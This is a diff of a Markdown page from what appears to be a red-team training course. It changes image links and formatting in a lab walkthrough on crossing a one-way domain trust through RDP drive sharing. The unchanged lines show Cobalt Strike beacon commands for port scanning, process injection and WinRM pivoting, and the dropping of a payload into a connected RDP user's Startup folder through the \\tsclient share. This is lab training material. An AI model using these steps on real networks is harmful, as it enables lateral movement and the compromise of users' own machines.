@@ -1,7 +1,5 @@
 # One way (outboud)
 
-&#x20;
-
 This can be the most difficult type of trust to hop. Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. If we're in Domain A, it's by design that we should not be able to access Domain B, but there are circumstances in which we can slide under the radar. One example includes a SQL Server link created in the opposite direction of the domain trust (see **MS SQL Servers**).
 
 Another, perhaps more realistic scenario, is via RDP drive sharing (a technique dubbed **RDPInception**). When a user enables drive sharing for their RDP session, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto their machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.
@@ -47,7 +45,7 @@ A methodology that has worked well for me in the past, is to enumerate the curre
 
 BloodHound will show that `Jump Users` have first degree RDP rights to **EXCH-1** and **SQL-1**.
 
-![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/jump-users-rdp.png)
+![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788103/hzygb0pufrnwvrqvvkcf.png)
 
 `Get-DomainGPOUserLocalGroupMapping` and `Find-DomainLocalGroupMember` can both work as well.
 
@@ -130,8 +128,6 @@ beacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024
 Scanner module is complete
 ```
 
-&#x20;
-
 **OPSEC Alert**
 
 Obviously be cautious about port scanning whole subnets, as networking monitoring tools can detect it.
@@ -145,7 +141,7 @@ beacon> inject 4960 x64 tcp-local
 [+] established link to child beacon: 10.10.15.90
 ```
 
-![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/sql1-jeanwise.png)
+![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788104/koi357oc8rkxrcasfc4a.png)
 
 In that Beacon, we are `jean.wise`.
 
@@ -187,7 +183,7 @@ beacon> jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
 [+] established link to child beacon: 10.10.18.221
 ```
 
-![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/sql01-jeanwise.png)
+![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788105/ca017iqtyisypnnogwrp.png)
 
 I use another Pivot Listener here because with the Windows Firewall enabled on SQL01, we can't connect inbound to 445 (so no SMB listener) or other arbitrary ports like 4444 (so no TCP listener). The Windows Firewall is not enabled on SQL-1, so we can bind to a high-port and catch the reverse connection from the Pivot Listener.
 
@@ -224,7 +220,7 @@ This gives us the equivalent of standard user read/write access to that drive. T
 
 You can simulate this in the lab by disconnecting and reconnecting your console access.
 
-&#x20; Don't put your pivot listener on the Beacon injected into `jean.wise` on SQL-1. When the RDP session is disconnected, the Beacon will die and you'll lose the pivot.
+Don't put your pivot listener on the Beacon injected into `jean.wise` on SQL-1. When the RDP session is disconnected, the Beacon will die and you'll lose the pivot.
 
 ```
 beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@@ -239,4 +235,4 @@ beacon> ls
 
 Disconnect and reconnect to the console of sql01.zeropointsecurity.local to simulate a user logoff/logon, and the Beacon will execute.
 
-![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/rdpinception.png)
+![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788106/fzaaodt4i2kim6ubc0tu.png)
